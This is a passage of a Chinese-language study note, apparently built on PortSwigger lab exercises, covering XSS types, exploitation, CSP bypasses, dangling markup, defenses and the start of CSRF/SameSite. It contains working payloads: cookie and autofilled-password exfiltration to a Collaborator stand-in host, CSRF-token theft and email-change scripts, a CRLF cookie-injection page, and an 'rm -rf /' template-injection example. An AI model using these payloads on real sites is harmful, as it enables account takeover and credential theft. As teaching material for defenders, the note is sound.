<p>Status: <script>/* Bad stuff here... */</script></p>
```

当受害者点击上面构造的链接时，就会触发 js 脚本内容。







## 存储型 XSS

又叫持久化 XSS 或者二级 XSS。当应用程序接收到用户提交的 HTTP数据并存储，作为后续流程中的数据进行返回，就属于这种类型。常见的有 BLOG 评论发表、用户昵称展示、订单展示信息。  

示例：

有一个消息广播应用可以提交内容，输入框大致如下：

```
<p>Hello, this is my message!</p>
```

黑客可以提交如下内容：

```
<p><script>/* Bad stuff here... */</script></p>
```

这些内容就会被发送到读取该消息的用户浏览器被执行。



## 基于 DOM 的 XSS

应用通过一些不安全的方式处理用户提交的数据，并将数据写回到 DOM 中。

示例：

应用使用一段 JS 读取用户提交的值，将该值用于生成一段 HTML  

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

黑客同样可以构造恶意脚本

```
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```



数据从 Source 流向 Sink，即 URL 流向 eval/innerHTML ，导致恶意代码执行。  

手工测试方法：

* 测试 innerHTML 类 Sink
  * URL 中塞入字符串
  * 打开F12调试面板 Elements 中 Ctrl + F 搜索字符串
  * 观察出现在哪个上下文中，标签或者属性
  * Chrome、FireFox 会自动编码 URL 里的特殊字符，导致 Payload 失效
* 测试 JS 执行类 Sink
  * 打开 F12调试面板，源码 Source 中 Ctrl + Shift + F 全局搜索 location 等关键词
  * 在读取 Source 处打断点
  * 按 F10 单步调试，追踪数据被传递给哪些变量，然后一路追踪直到传递给 eval、setTimeout 等
  * 鼠标悬停查看值，确认 Payload 是否完好抵达 Sink



常见的一些 Sinks ：

* document.write() 
* document.writeln() 
* document.domain 
* element.innerHTML 
* element.outerHTML 
* element.insertAdjacentHTML 
* element.onevent



框架 jQuery 常见 sinks ：

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```







## 常见用途

* 冒充用户
* 执行用户有权限执行的动作
* 读取数据
* 捕获用户相关凭证
* 篡改网站数据
* 植入木马到网站







## exploit

三种流行的利用 XSS 的事件类型：

* cookie 窃取，但实战中会受到一些限制：

  * 受害者可能根本没登录

  * 很多应用会用 `HttpOnly` 标记，让 JS 读不到 Cookie

  * Session 可能被绑定了额外因素，比如用户的 IP 地址

  * 没来得及利用，Session 可能就已经超时失效了

  * portswigger 示例，评论区注入脚本获取用户 cookie，这里由于实验限制就将 cookie 以 POST 请求提交评论的形式打印出来，实际会替换为服务器：

    ```javascript
    <script>
    window.onload = function() {
        var csrfEl = document.querySelector('input[name="csrf"]');
        var postIdEl = document.querySelector('input[name="postId"]');
    
        if (!csrfEl || !postIdEl) {
            console.error('csrf 或 postId 没找到:', csrfEl, postIdEl);
            return;
        }
    
        var csrf = csrfEl.value;
        var postId = postIdEl.value;
        var cookieValue = document.cookie;
    
        fetch('/post/comment', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'csrf=' + encodeURIComponent(csrf) +
                  '&postId=' + encodeURIComponent(postId) +
                  '&comment=' + encodeURIComponent(cookieValue) +
                  '&name=a&email=b%40c.d&website=http%3A%2F%2Fe.f'
        });
    };
    </script>
    ```

    * 官方简洁版
    
      ```javascript
      <script>
      fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
      method: 'POST',
      mode: 'no-cors',
      body:document.cookie
      });
      </script>
      ```
    
      

* 截获密码

  * 伪造输入框，让用户输入

  * 或者利用当前很多密码管理器会自动填充密码，读取填充的密码并转发

  * portswigger 示例，产生一个表单诱导密码管理器填充，然后将获取的值发送出来，这里和上面示例一样打印到评论区：

    * 主要是将生成的 input 输入框 name、password 的属性设置为 autocomplete，大多数密码管理器通过该属性识别和填充
    * 这里有一行 `form.style.cssText = 'position:absolute;top:-9999px;left:-9999px;';` 注释掉了，作用是视觉上隐藏该输入框，使得密码管理器可以检测到但人眼无法直接看到，但在这个实验中不能获取到就注释掉。

    ```javascript
    <script>
    window.onload = function() {
        // 创建一个视觉上隐藏、但密码管理器能识别的登录表单
        var form = document.createElement('form');
        //form.style.cssText = 'position:absolute;top:-9999px;left:-9999px;';
    
        var userInput = document.createElement('input');
        userInput.setAttribute('type', 'text');
        userInput.setAttribute('name', 'username');
        userInput.setAttribute('autocomplete', 'username');
    
        var passInput = document.createElement('input');
        passInput.setAttribute('type', 'password');
        passInput.setAttribute('name', 'password');
        passInput.setAttribute('autocomplete', 'current-password');
    
        form.appendChild(userInput);
        form.appendChild(passInput);
        document.body.appendChild(form);
    
        // 等待密码管理器自动填充（通常需要短暂延迟）
        setTimeout(function() {
            var username = userInput.value;
            var password = passInput.value;
    
            // 没有填充内容就不提交，避免提交空评论
            if (!username && !password) {
                console.log('未检测到自动填充内容');
                return;
            }
    
            var csrf = document.querySelector('input[name="csrf"]').value;
            var postId = document.querySelector('input[name="postId"]').value;
            var captured = 'username=' + username + '&password=' + password;
    
            fetch('/post/comment', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'csrf=' + encodeURIComponent(csrf) +
                      '&postId=' + encodeURIComponent(postId) +
                      '&comment=' + encodeURIComponent(captured) +
                      '&name=a&email=b%40c.d&website=http%3A%2F%2Fe.f'
            });
        }, 2000); // 等待 2 秒，给密码管理器足够的时间完成自动填充
    };
    </script>
    ```

    * 官方的答案更简洁：

    ```javascript
    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">
    ```

    

* 绕过 CSRF 防护，XSS 攻击可以被利用做很多事情 

  * 发送消息、接收好友请求、修改信息、提交后门代码、转账等

  * 传统 CSRF 漏洞是单向的，攻击者无法看到响应的内容，但结合 XSS 就可以获取到响应内容，从而实现双向通信，发送任意请求，并获取任意响应内容

  * CSRF token 这种防护对 XSS 无效，因为可以读取到响应中的 token 值

  * portswigger 示例，实验博客的评论区存在 XSS 漏洞，通过如下脚本可以修改受害者的邮箱：

    ```javascript
    <script>
    fetch('/my-account', {credentials: 'same-origin'})
        .then(response => response.text())
        .then(data => {
            // 从 /my-account 页面的HTML里，正则提取出 csrf token
            const csrfMatch = data.match(/name="csrf" value="([^"]+)"/);
            if (!csrfMatch) {
                console.error('未能提取到 csrf token');
                return;
            }
            const csrf = csrfMatch[1];
    
            // 用这个 csrf token，提交修改邮箱的请求
            return fetch('/my-account/change-email', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                credentials: 'same-origin',
                body: 'csrf=' + csrf + '&email=attacker@evil-collaborator.net'
            });
        })
        .then(response => {
            if (response && response.ok) {
                console.log('邮箱修改请求已提交');
            }
        })
        .catch(error => console.error('错误：', error));
    </script>
    ```

    * 官方简洁版：
    
      ```javascript
      <script>
      var req = new XMLHttpRequest();
      req.onload = handleResponse;
      req.open('get','/my-account',true);
      req.send();
      function handleResponse() {
          var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
          var changeReq = new XMLHttpRequest();
          changeReq.open('post', '/my-account/change-email', true);
          changeReq.send('csrf='+token+'&email=test@test.com')
      };
      </script>
      ```
    
      





## XSS contexts

常见的 XSS context 有：

* HTML tag

  * 常用的 HTML tag 是利用 JavaScript 触发，例如：

    ```javascript
    <script>alert(document.domain)</script>
    <img src=1 onerror=alert(1)>
    ```

  * portswigger 常见 XSS cheat-sheet 表，包含tags、events ：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

  * 一些自定义标签、属性

  * SVG 等标签，这些标签使用相对较少，有时 WAF 等设备规则库中没有包含，导致不会全部检测

  * 大小写混合，例如：

    ```html
    <img src=1 oNeRrOr=alert`1`>
    ```

    

* HTML tag attributes

  * 常见的是利用漏洞中断属性标签，插入 payload，例如：`"><script>alert(document.domain)</script>`
  * 但是现在很多框架或网站对 `<` `>` 这种尖括号进行了屏蔽或者编码，就需要其它手段中断属性，例如 `" autofocus onfocus=alert(document.domain) x="` ，当元素获取到焦点时，会触发一个 onfocus 焦点事件，执行设置的 js 代码 alert()，并添加 x= 去修复后续 HTML 标签

* JavaScript

  * 结束已存在的 script 标签，例如有一段js如下：

    ```
    <script>
    ...
    var input = 'controllable data here';
    ...
    </script>
    ```

    * 将 input 内容替换为：`</script><img src=1 onerror=alert(document.domain)>` 就可以结束 script 段并注入新内容

  * 中断 js 字符串

    * 常见的有

      ```
      '-alert(document.domain)-'
      ';alert(document.domain)//
      ```

    * 有的网站使用转义字符 `\` 将一些特殊字符转义后再交给 js 解析器，但有时实现的不够完善仍会存在漏洞，例如 `';alert(document.domain)//` 这样一个 payload ，可能被转移为 `\';alert(document.domain)//`，此时将 payload 修改为 `\';alert(document.domain)//`，语句就被转义为 `\\';alert(document.domain)//`

    * 在更严格一些的场景中，例如部署了 WAF 等设备，会对输入的字符做限制，`()` 之类的会被限制，此时可以利用 `throw` 关键字，例如 `onerror=alert;throw 1` 中 throw 会将参数 1 传递给 alert 执行，参考 ：https://portswigger.net/research/xss-without-parentheses-and-semi-colons

  * Making use of HTML-encoding

    * 注入点位于 HTML 的属性，浏览器在解析 response 中的 HTML 标签时，会先对属性值做一次 decode ，如果服务端拦截了一些 XSS，此时就可以加以利用，将要注入的内容以 HTML 编码的形式提交以绕过服务端检测
    * 示例：`<a href="#" onclick="... var input='controllable data here'; ...">`
    * 上面示例可以使用 `&apos;-alert(document.domain)-&apos;` 注入内容，`&apos;` 会被转义成单引号(撇号)

  * XSS in JavaScript template literals

    * JS 模板字符串，是一种允许内嵌 JS 表达式的字符串写法

    * 示例：可以通过 `${}` 注入内容

      ```
      document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
      ```

    * 注入 `${alert(document.domain)}` 

* Client-side template injection

  * 有一些网站使用客户端模板框架，例如 AngularJS，动态生成web页面，如果这些框架存在不安全的实现，也会导致黑客利用模板表达式注入XSS内容
  * AngularJS 模板注入：https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs





## Dangling markup injection

悬浮标记注入是一般常规 XSS 被拦截或禁止后的一种手法，常用于跨域窃取信息。  

假设应用有如下内容，且没有禁止 `>` 和 `"` 符号：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

注入如下内容：

```html
"><img src='//attacker-website.com?
```

当浏览器渲染页面后，会生成：

```html
<input type="text" name="input" value=""><img src='//attacker-website.com?
```

前面的 input 输入框被闭合，插入新的 img 标签未闭合，浏览器会将页面中下一个 `'` 单引号之前的数据都作为请求发送到这里指定的域名，能窃取到的内容取决于页面，可能包含 token、个人信息等。  



portswigger 示例：

有一个博客网站，配置了严格的 CSP，但存在 hangling markup 注入，诱导受害者用户点击链接，获取其 csrf token 并修改邮箱：

```html
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0aa900e304a0eafd80790db70086007a.web-security-academy.net/";
const exploitServer = "https://exploit-0aa800700427eab780c30cc3012d00bf.exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

![image-20260821120854745](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260821120854745.png)

exploit 服务器可以看到通过 hangling markup 携带信息的请求：

![image-20260821120936708](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260821120936708.png)



## Content Security Policy (CSP)

CSP 这种浏览器安全机制是为了减少 XSS 、dangling markup 、点击劫持之类的攻击。  

服务器返回给浏览器的 response header 中要包括：Content-Security-Policy 这一项。  

* `script-src 'self'`：只允许加载同源站点的脚本
* `script-src https://scripts.normal-website.com`：允许加载指定网站的脚本
* `img-src 'self'`：只允许加载同源站点的图像资源
* `img-src https://images.normal-website.com`：允许加载指定网站的图像资源
* `frame-ancestors 'self'`：只允许同源页面嵌入
* `frame-ancestors 'none'`：完全禁止嵌入
* `frame-ancestors 'self' https://normal-website.com https://*.robust-website.com`：允许嵌入页面的域



Chrome 新出的 `script-src-elem` 可以覆盖旧的 `script-src`，这在一些把输入反射到 report-uri 指令里的网站，可以被利用以注入分号来添加 CSP 指令。  

示例实验：

请求简化如下：

```html
GET /?search=friends HTTP/2
```

响应简化如下：

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
X-Frame-Options: SAMEORIGIN
Content-Length: 4394

```

修改请求在 uri 中传入 token ：

```html
GET /?search=friends&token=123
```

响应头变为了：

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123
```

再次修改，将搜索内容替换为 js 并将 token 值替换为 `; script-src-elem 'unsafe-inline'`：

```html
GET /?search=%27%3Cscript%3Ealert(1)%3C/script%3E%27&token=123;script-src-elem%20%27unsafe-inline%27 HTTP/2
```

响应就变为如下内容：

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123;script-src-elem 'unsafe-inline'


... omit ...

                   <section class=blog-header>
                        <h1>0 search results for ''<script>alert(1)</script>''</h1>
                        <hr>
                    </section>

... omit ...
```

由于浏览器识别到了新指令 **`script-src-elem 'unsafe-inline'`**。因为这个新指令**覆盖（Override）** 了旧的 `script-src`，所以现在页面上可以执行内联脚本（`<script>alert(1)</script>`）了。



## 预防 XSS 攻击



### 输出编码

编码将要输出到客户端的数据内容。  

在 HTML 上下文中，要转换非白名单的值为 HTML entities，例如：  

* `<` 转换为 `&lt;`
* `>` 转换为 `&gt;`

在 JavaScript 字符串上下文中，要转换非字母及数字的值为 Unicode，例如：  

* `<` 转换为 `\u003c`
* `>` 转换为 `\u003e`

有些时候需要转换两次，且顺序不能错，下面示例中，要先将 onclick 对应字符串转为 js 安全的 Unicode，再转换成 HTML 编码：

```html
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```

假设如下内容只做了 HTML 编码：

```php
onclick="func('<?php echo $user_input; ?>')"
```

通过 Payload `\u0027\u0029\u003b alert(1)\u002f\u002f` （包含了 Unicode 编码的单引号、括号、分号）还是可以实现逃逸，这些编码不会被 htmlspecialchars，JS 解析器会还原成 `'; alert(1)//`。







### 验证输入

提交的数据要严格检查

* 如果用户提交了一个 URL 就检查是否以 `http://` 或 `https://`  开头，防止`javascript:` 之类的协议
* 如果提交了数字检查是否是纯数字
* 检查字符串是否只包含字母和数字
* 发现异常直接拒绝，避免尝试清除掉异常字符之类操作，容易出现逻辑漏洞
* 使用白名单而不是黑名单，避免黑客通过一些手段绕过黑名单。





### 允许"安全的" HTML

* 尽量避免让用户提交 HTML 
* 但在一些业务场景下有此类需求，传统做法是使用白名单，只允许部分标签，但由于各个浏览器解析方式的差异、Mutation XSS 之类的漏洞，人工写正则之类的过滤无法做到绝对安全
* Mutation XSS 是指一些场景下浏览器添加或者修改了一些内容，例如输入：`<table><td>...</td></table>`，但浏览器可能帮你补全 `<tbody>`，特殊场景下会被拼接出恶意字符串。

* 使用 DomPurify 之类的框架，但这类框架有时也会出现漏洞，要时常关注修复



### 使用模板引擎

* 现在大多数网站使用模板引擎，例如 Twig、Freemarker，这些模板引擎有各自实现的 Escaping System(消毒系统)，将输入的数据做转义。
* Jinjia、React 之类的框架，默认会开启消毒模式，这样能避免大多数 XSS 。
* 选择框架时一定要研究清楚它们的 escaping feature （消毒机制），有的默认不开启，有的只转义 HTML 不转义 JS。
* 一定要避免在模板中拼接传入字符串，容易引发 SSTI
  * 例如 `render("Hello {{ name }}")` ，传入的是 `name = "<script>"`，模板引擎把 `<` 转成 `<`，输出安全的文本 `Hello &lt;script&gt;`
  * 如果使用的是拼接方式 `render("Hello " + user_input)` 传入 `"<script>"`，直接拼接出 `Hello <script>`，浏览器解析 HTML 并执行脚本（XSS）。
  * 如果输入变为 **`{{ 7*7 }}`** 这种，模板引擎会当成普通字符串转义后输出 `Hello {{ 7*7 }}`，而字符串拼接方式则会导致服务器计算后再输出 `Hello 49`，如果被替换为 `{{ system('rm -rf /') }}` 则导致服务器瘫痪。





### In PHP

PHP 有一个内建的方法 `htmlentities` ，有 3 个参数：

* 输入字符串
* ENT_QUOTES 标志
* 字符集，常用的是 UTF-8
* 示例 `<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?>`



但当在处理 JavaScript 字符串上下文时，需要转为 Unicode-escape，但不幸的是 PHP 没有提供这种 API，这里提供一种方式进行转换：

```php
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i=0;$i<count($str);$i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= '\u2028';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= '\u2029';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
            break;
            default:
                $output .= $str[$i];
            break;
    }
    }
    return $output;
}
?>
```

调用示例：

```php
<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
```





### In JavaScript

在 JS 中要输出 HTML 字符串，编码为 HTML 格式：

```apl
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
```

使用示例：

```javascript
<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>
```

如果要输出 JavaScript 字符串，编码为 Unicode-escape：

```javascript
function jsEscape(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

使用示例：

```javascript
<script>document.write('<script>x="'+jsEscape(untrustedValue)+'";<\/script>')</script>
```









### In jQuery

`$()` 方法在旧版本中检测到字符串以 `#` 开头就会当成 HTML 渲染，存在被利用的漏洞，新版本已做了修复。也可以参考上面 JavaScript 的 jsEscape 方法进行转义避免漏洞。





### Using CSP

* CSP 是最后一道防御，假设前面的防御都失效或者被攻破，如果 CSP 设置的比较严格，会限制攻击者能做的行为。  

  * 在响应头中包含 `Content-Security-Policy` 字段就可以配置 CSP 策略。  

  * 示例策略：`default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`

  * 上面策略限制了只能从本域名加载脚本、图片等资源。  

* 但是如果允许了 CDN 等外部域名，这个域名下所有的 JS、资源文件，都可以被利用来绕过 CSP。 

* 还可以使用 Nonce （一次性随机数）机制，服务器每次随机生成一个超长字符串，将字符串同时放进 CSP 头和 `<script>` 标签中，浏览器对比一致后才运行脚本。这样黑客无法预知该字符串，即使注入脚本也无法执行。但对于反射型 DOM ，CSP 也无法防护，例如：黑客利用 `eval(location.hash)` 执行代码，，`eval` 本身是页面自己的 JS 代码（有 Nonce 许可），所以 CSP 管不了它。



如果一个网站开启了 CSP ，渗透测试时还可以做如下尝试：

1. **检查 `script-src` 是否包含 `unsafe-inline`**：如果包含，直接打传统 XSS（因为内联脚本被允许）。
2. **检查是否包含 `unsafe-eval`**：如果包含，用 `eval` 或 `setTimeout` 字符串执行绕过。
3. **检查白名单域名**：如果白名单里有 `ajax.googleapis.com`，尝试加载 `ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js`（旧版 Angular 有 CSP 绕过漏洞）。
4. **寻找 JSONP 端点**：如果白名单里有 `example.com`，且该域名下有 JSONP 接口（`?callback=func`），你可以构造 `func('alert(1)')` 利用它执行代码（这是经典的 CSP 绕过技巧）。
5. **检测 Nonce 泄露**：如果在页面源码里发现了 `<script nonce="abc">`，且这个 Nonce 被输出到了 HTML 注释或错误信息中，你可以窃取它并构造自己的 `<script nonce="abc">alert(1)</script>`。







# CSRF(Cross-site request forgery) 跨站请求伪造



## 影响及条件

CSRF 是一种 Web 安全漏洞，攻击者诱导用户执行他们无意执行的操作，允许攻击者绕过或部分绕过同源策略 SOP ，该策略是为了防止不同网站之间相互干扰。  



要发起 CSRF 攻击，存在几个关键条件：

* 存在关联动作：攻击者可以诱导用户触发的动作，例如调整权限，修改数据等。
* 基于 cookie 的会话处理：执行该操作需要发起一个或多个 HTTP 请求，并且应用仅依靠会话 Cookie 来识别发起者，系统中没有其他机制用于跟踪会话或者验证用户请求。
* 没有不可预测(unpredictable)的参数：执行的操作中，不包含攻击者无法猜测或确定的参数。例如修改密码需要知道当前密码，如果需要就不存在 CSRF 漏洞。



portswigger 示例，假设某应用存在如下请求用于修改用户邮箱：

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

此请求符合上面描述的条件：

* 存在相关操作，修改邮箱成功后通常可以触发密码重置之类功能，从而控制账户。
* 依赖 Cookie：通过 Cookie 来识别会话，没有其它机制
* 参数可预测：仅存在 cookie、email 地址

通过上面条件，攻击者可以构造如下 HTML 页面：

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();  // 页面加载后自动提交表单
        </script>
    </body>
</html>
```

当受害者被诱骗访问这个页面后，会执行如下动作：

* 向网站发起 HTTP 请求
* 如果受害者已经登录网站，浏览器会自动携带相关 cookie （这里假设未启用 Samesite Cookie 机制）
* 网站将这个请求视作受害者本人操作，按照正常流程处理修改邮箱操作





## 构造和传递 CSRF exploit

典型的方法是通过 email、社交软件传递 http链接，诱骗用户访问恶意构造的钓鱼网站，或者在一些流行的网站评论区、帖子上发表链接等待用户访问。有一些简单的 CSRF expolit 利用 GET 请求可以完全包含在一个单一的 URL 请求中，例如假设一个网站可以通过 GET 请求修改邮箱，一个自包含的攻击可能如下：

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

  

XSS 和 CSRF 的区别：

* XSS 通常允许攻击者在用户浏览器中执行任意 JS 代码
* CSRF 通常是攻击者诱导用户做出并非他们本意的动作
* 通常 XSS 的严重性高于 CSRF
* CSRF token 是否能够预防 XSS 攻击取决于场景
  * 如果网站存在 反射型 XSS 漏洞的功能，设置了 CSRF token 校验，该漏洞会被防护，但其它存在 反射型 XSS 漏洞的功能如果未设置校验 CSRF token 则不会被防护
  * CSRF token 不能防护存储型 XSS 攻击
  * 正确处理 XSS 还是要从 检查输入、输出编码、CSP 等机制入手



## 防御 CSRF 的机制

* CSRF Token ：服务器生成，与客户端共享且唯一的值，客户端提交敏感操作时携带 token，服务器检查是否有正确凭证
* SameSite cookies：请求来自其它网站时，浏览器决定是否携带某网站的 cookie
* Referer-based validation：服务器检查请求来源，即 Header 中的 Referer 字段







## CSRF Token

一个 CSRF token 通常是由服务端应用生成的：唯一、机密、不可预测的一个值，共享给客户端。当客户端触发一个敏感动作，例如提交表单时，应该携带正确的 token，否则服务端拒绝该请求。  

一个常见的方式是在返回的 HTML 的 form 表单中存放 csrf 值并设置为隐藏属性，例如：

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>

```

提交这个表单时的请求大致如下：

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

当正确实现时，CSRF token 可以帮助防护 CSRF 攻击，攻击者无法预测，就无法在发起的恶意请求中包含该 token。



**常见缺陷**  

* 未在所有请求方法上都做校验，例如常规是 POST 请求做了 token 校验，但更换为 GET 请求则直接通过

* 有些应用程序在 token 缺失时跳过校验，通常是程序实现中仅校验 token 是否存在而不是是否有效

* token 没有和用户 session 关联，会话池中任意 token 都可以通过校验

* 双重提交 Cookie 防御机制：服务端不存储 Token 而是直接返回给客户端 Cookie 中，但是如果网站存在任何可以修改客户端 Cookie 的功能，就能被轻易绕过

  * portswigger 实验示例：

    ```html
    <!-- 通过 search 功能注入 cookie 中 csrf ，然后再将 csrf 和 邮箱 POST 提交 -->
    <html>
        <body>
            <form action="https://0a5f001503af559980c0038200840008.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
    			<input required type=hidden name=csrf value=XXXXXX>
            </form>
            <img src="https://0a5f001503af559980c0038200840008.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=XXXXXX%3b%20SameSite=None" onerror="document.forms[0].submit()">
        </body>
    </html>
    ```

    





## SameSite cookies

SameSite 是一种浏览器安全机制，用于确定来自其它网站的请求中，何时包含一个 cookie。SameSite Cookie 主要为跨站访问提供部分保护，用于 CSRF、Cross-site leak、CROS 等。  



### Context 

在 SameSite context 中，Site 被定义为： TLD 顶级域（例如 `.com`、`.net` 等）加上一个额外层级，通常也被称为 TLD+1（例如 `example.com`）。URL协议（Scheme）的不同通常也被视为不同站点。还有一类称为 eTLD （顶级有效域）的域名，例如 `.com.cn`、`.co.uk` 这种在实践中通常也被视为同站点，eTLD 域名的计算机制参考**公共后缀列表（Public Suffix List，PSL）**。  

![image-20260825162322762](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260825162322762.png)



### Site VS Origin

这两个术语的主要区别在于范围(Scope)，它们密切相关但不能互换，混为一谈可能会有安全隐患。  

如果两个 URL 使用完全相同的协议(Scheme)、域名和端口，则被视为相同的 Origin。而 Site 只考虑协议和域名最后一部分(eTLD)，一个跨源请求（Cross-origin）可以是同站（SameSite）的，反过来则不行。  



![image-20260825163125117](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260825163125117.png)





| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |





### 工作机制

在 SameSite 安全机制出现之前，浏览器会在每个 request 中携带该域名的 Cookie，即使请求是由完全不相关的第三方网站发起。SameSite 的出现是为了让网站开发者和浏览器控制哪些跨站请求（ Cross-Site）可以携带特定的 Cookie。这样可以降低收到 CSRF 攻击的风险，因为 CSRF 类的攻击通常是诱导用户触发一些有害的操作，需要携带受害者的会话 Cookie，如果浏览器限制了携带 Cookie，攻击就会失效。   

从 2021 年起，如果网站没有显式地声明，Chrome 默认采用 Lax 级别的 SameSite 限制。主流浏览器支持这3种 SameSite 级别：

* Strict ：在任何跨站请求中都不会携带 Cookie，这是最安全的选项，但会影响用户体验，例如导航中跳转到一个目标网站也算跨站，Strict 级别下这种跳转不会携带 Cookie，需要重新登录。
* Lax：有条件的鞋带 Cookie，必须同时满足两个条件：GET 请求 + 用户主动触发的顶层导航操作。这样在 POST 请求、后台请求（`<script>`中发起的 `fetch`、`<iframe>`、`<img>` 之类）这些 CSRF 常见的利用方式中都不携带。
* None：和 SameSite 机制出现之前一样。
  * 设置 `SameSite=None` 时必须同时加上 `Secure` 属性，强制要求这个 Cookie 只能在 https 中传输。
  * 除了 Chrome 之外，其它浏览器在未显式设置该属性时，默认是 None 级别。  



### 绕过 SameSite

在一些场景下即使配置了 SameSite 也存在漏洞可以绕过：

* Lax 模式下利用 GET 方法。

  * 如果服务端接口可以处理 GET 请求，就可以通过如下请求绕过

    ```html
    <script>
        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
    </script>
    ```

    

  * 还有一种 `_method`  参数覆盖请求的方法，有些框架支持“方法覆盖”，读取 `_method` 这个隐藏的参数，虽然浏览器提交使用 GET 方法并携带了 Cookie，但是框架按照 POST 方法处理：

    ```html
    <form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
        <input type="hidden" name="_method" value="POST">
        <input type="hidden" name="recipient" value="hacker">
        <input type="hidden" name="amount" value="1000000">
    </form>
    ```

    

* 找到可以利用的客户端跳转。

